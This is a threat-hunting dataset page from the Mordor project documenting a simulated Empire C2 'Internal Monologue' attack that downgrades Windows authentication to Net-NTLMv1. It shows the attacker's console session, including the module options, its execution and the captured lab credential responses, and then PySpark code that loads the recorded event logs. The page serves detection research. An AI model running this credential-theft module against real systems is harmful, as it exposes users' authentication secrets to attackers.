# Extended NetNTLM Downgrade

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-191225045202 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/12/25 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-InternalMonologue.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/small_datasets/windows/credential_access/empire_extended_netntlm_downgrade.tar.gz |

## Dataset Description
This dataset represents adversaries downgrading the challenge/response authentication protocol used for network logons, the minimum security negotiated for applications using NTLMSSP, and security settings that restrict outgoing NTLM traffic to remote servers in an environment

## Adversary View
```
(Empire: XFLEZM9N) > usemodule credentials/invoke_internal_monologue*
(Empire: powershell/credentials/invoke_internal_monologue) > info

            Name: Invoke-InternalMonologue
            Module: powershell/credentials/invoke_internal_monologue
        NeedsAdmin: True
        OpsecSafe: False
        Language: powershell
MinLanguageVersion: 2
        Background: False
OutputExtension: None

Authors:
@eladshamir
@4lex

Description:
Uses the Internal Monologue attack to force easily-
decryptable Net-NTLMv1 responses over localhost and without
directly touching LSASS.
https://github.com/eladshamir/Internal-Monologue

Comments:
The underlying powershell function accepts switches that
[DISABLE] default behaviours. The default settings will
downgrade NetNTLM responses to v1, impersonate all users,
use challenge 1122334455667788 and restore the registry to
its original state. Set the options in this module to True
in order to DISABLE the behaviours Disabling Downgrade and
Impersonation yields higher OPSEC, but less than ideal loot

Options:

Name        Required    Value                     Description
----        --------    -------                   -----------
Agent       True        XFLEZM9N                  Agent to use for InternalMonologue      
Challenge   True        1122334455667788          Net-NTLM Challenge to send              
Downgrade   False                                 DISABLE downgrading to allow Net-NTLMv1 
                                                    responses                               
Impersonate False                                 DISABLE user impersonation and fetch    
                                                    only current user                       
Restore     False                                 DISABLE restoring the registry setting  
                                                    that allowed v1 responses               
Verbose     False                                 Verbose                                 

(Empire: powershell/credentials/invoke_internal_monologue) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked XFLEZM9N to run TASK_CMD_WAIT
[*] Agent XFLEZM9N tasked with task ID 2
[*] Tasked agent XFLEZM9N to run module powershell/credentials/invoke_internal_monologue
(Empire: powershell/credentials/invoke_internal_monologue) > pgustavo::shire:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:1122334455667788
IT001$::shire:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:1122334455667788
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/small_datasets/windows/credential_access/empire_extended_netntlm_downgrade.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        